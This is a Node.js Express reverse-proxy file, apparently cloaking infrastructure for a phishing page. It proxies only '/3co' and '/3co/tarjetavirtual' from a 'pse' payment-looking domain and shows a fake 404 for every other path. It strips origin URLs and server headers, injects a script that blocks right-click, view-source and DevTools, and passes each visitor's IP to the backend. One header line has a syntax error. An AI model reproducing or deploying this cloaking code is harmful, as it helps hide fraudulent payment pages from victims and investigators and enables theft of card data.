const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const helmet = require('helmet');
const crypto = require('crypto');
const zlib = require('zlib');
const { promisify } = require('util');

const gunzip = promisify(zlib.gunzip);
const inflate = promisify(zlib.inflate);
const inflateRaw = promisify(zlib.inflateRaw);
const brotliDecompress = promisify(zlib.brotliDecompress);
const gzip = promisify(zlib.gzip);
const deflate = promisify(zlib.deflate);
const brotliCompress = promisify(zlib.brotliCompress);

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_URL = process.env.TARGET_URL || 'https://pse.pwm435.space';
const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];

// Seguridad adicional
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// Eliminar headers que revelan información
app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');
  next();
});

// Funciones auxiliares de compresión
const decompress = async (buffer, encoding) => {
  if (!encoding) return buffer;
  const enc = String(encoding).toLowerCase();
  try {
    if (enc.includes('gzip')) return await gunzip(buffer);
    if (enc.includes('br')) return await brotliDecompress(buffer);
    if (enc.includes('deflate')) {
      // Algunos servidores envían deflate sin cabecera zlib
      try { return await inflate(buffer); } catch { return await inflateRaw(buffer); }
    }
  } catch (e) {
    // Si falla la descompresión, devolvemos el buffer tal cual
    return buffer;
  }
  return buffer;
};

const recompress = async (buffer, encoding) => {
  if (!encoding) return buffer;
  const enc = String(encoding).toLowerCase();
  if (enc.includes('gzip')) return await gzip(buffer);
  if (enc.includes('br')) return await brotliCompress(buffer);
  if (enc.includes('deflate')) return await deflate(buffer);
  return buffer;
};

// Función para ofuscar URLs en el contenido
const obfuscateContent = (contentString, contentType) => {
  if (!contentType || !contentType.includes('text/html')) {
    return Buffer.from(contentString, 'utf8');
  }

  // Reemplazar referencias al dominio real (conserva render.com)
  let modified = contentString.replace(/https?:\/\/[^\/\s"']+/g, (match) => {
    if (match.includes('render.com')) return match;
    return '';
  });

  // Inyectar script anti-inspección (conservador)
  const antiInspectScript = `
<script>
(function(){
  // Deshabilitar click derecho
  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });

  // Deshabilitar F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
  document.addEventListener('keydown', function(e){
    if(
      e.keyCode === 123 ||
      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
      (e.ctrlKey && e.keyCode === 85)
    ){
      e.preventDefault();
      return false;
    }
  });

  // Detección simple de DevTools (sin vaciar el body)
  setInterval(function(){
    if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200){
      if(!sessionStorage.getItem('dt_warned')){
        sessionStorage.setItem('dt_warned', '1');
        console.warn('DevTools detectado');
      }
    }
  }, 500);
})();
</script>
`;

  if (modified.includes('</body>')) {
    modified = modified.replace('</body>', antiInspectScript + '</body>');
  }

  return Buffer.from(modified, 'utf8');
};

// Middleware para verificar rutas permitidas
app.use((req, res, next) => {
  const path = req.path;
  const isAllowed = ALLOWED_PATHS.some(allowedPath =>
    path === allowedPath || path.startsWith(allowedPath + '/')
  );

  if (!isAllowed && !path.startsWith('/assets') && !path.startsWith('/css') && !path.startsWith('/js')) {
    // Respuesta genérica para rutas no permitidas
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>404 Not Found</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #333; }
        </style>
      </head>
      <body>
        <h1>404 - Page Not Found</h1>
        <p>The requested resource could not be found.</p>
      </body>
      </html>
    `);
    return;
  }
  next();
});

// Configuración del proxy (Opción 2: descomprimir → modificar → recomprimir)
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true, // Importante para usar responseInterceptor

  // Modificar request
  onProxyReq: (proxyReq, req, res) => {
    // Agregar headers personalizados
    const userDomain = req.get('host') || 'unknown.onrender.com';
    const userIp = req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.connection?.remoteAddress ||
      'unknown';

    proxyReq.setHeader('user_domain', userDomain);
    proxyReq.setHeader('user_ip', String(userIp).split(',')[0].trim());

    // Mantener apariencia de navegador real
    if (!req.get('User-Agent')) {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    }
    proxyReq.setHeader('Accept-Language', req.get('Accept-Language') || 'es-ES,es;q=0.9,en;q=0.8');
    // Permitimos compresión aguas arriba para eficiencia (se gestionará abajo)
    proxyReq.setHeader('Accept-Encoding', req.get('Accept-Encoding') || 'gzip, deflate, br');

    // ID único de sesión ofuscado
    const sessionId = crypto.randomBytes(16).toString('hex');
    proxyReq.setHeader('X-Session-Id', sessionId);

    // (Opcional) No ocultar del todo x-forwarded-*; muchos backends los necesitan
    // Si realmente quieres ocultarlos, comenta estas líneas:
    // proxyReq.removeHeader('x-forwarded-for');
    // proxyReq.removeHeader('x-forwarded-host');
    // proxyReq.removeHeader('x-forwarded-proto');
  },

  // Interceptar y modificar response (descompresión/recompresión segura)
  onProxyRes: (proxyRes, req, res) => {
    // Sanitizar headers de servidor (sin debilitar protecciones como X-Frame-Options)
    delete proxyRes.headers['x-powered-by'];
    delete proxyRes.headers['server'];
    delete proxyRes.headers['x-aspnet-version'];
    delete proxyRes.headers['x-aspnetmvc-version'];

    // Headers de seguridad adicionales (no romper caché si no quieres; aquí forzamos no-cache)
    proxyRes.headers['X-Content-Type-Options'] = 'nosniff';
    proxyRes.headers['X-XSS-Protection'] = '1; mode=block';
    proxyRes.headers['Referrer-Policy'] = 'no-referrer';
    proxyRes.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'];
  },

  // Interceptor del cuerpo
  on: {
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      const contentType = proxyRes.headers['content-type'] || '';
      const contentEncoding = proxyRes.headers['content-encoding']; // puede ser gzip/deflate/br

      // Solo tocar HTML
      if (!String(contentType).includes('text/html')) {
        // No modificar nada; mantener compresión/longitud original
        return responseBuffer;
      }

      // 1) Descomprimir si es necesario
      const decompressed = await decompress(responseBuffer, contentEncoding);

      // 2) Modificar HTML
      const htmlString = decompressed.toString('utf8');
      const modifiedBuffer = obfuscateContent(htmlString, contentType);

      // 3) Re-comprimir con el mismo algoritmo (si existía)
      const reCompressed = await recompress(modifiedBuffer, contentEncoding);

      // 4) Ajustar content-length al tamaño final (o eliminarlo y dejar chunked)
      // Aquí lo ajustamos explícitamente
      proxyRes.headers['content-length'] = Buffer.byteLength(reCompressed);

      return reCompressed;
    })
  },

  // Manejo de errores
  onError: (err, req, res) => {
    console.error('Proxy error:', err && err.message ? err.message : err);
    res.status(502).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Service Temporarily Unavailable</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #333; }
        </style>
      </head>
      <body>
        <h1>Service Temporarily Unavailable</h1>
        <p>Please try again later.</p>
      </body>
      </html>
    `);
  }
};

// Aplicar el proxy
app.use('/', createProxyMiddleware(proxyOptions));

// Manejo de errores global
app.use((err, req, res, next) => {
  console.error('Application error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
  console.log('Allowed paths:', ALLOWED_PATHS.join(', '));
});
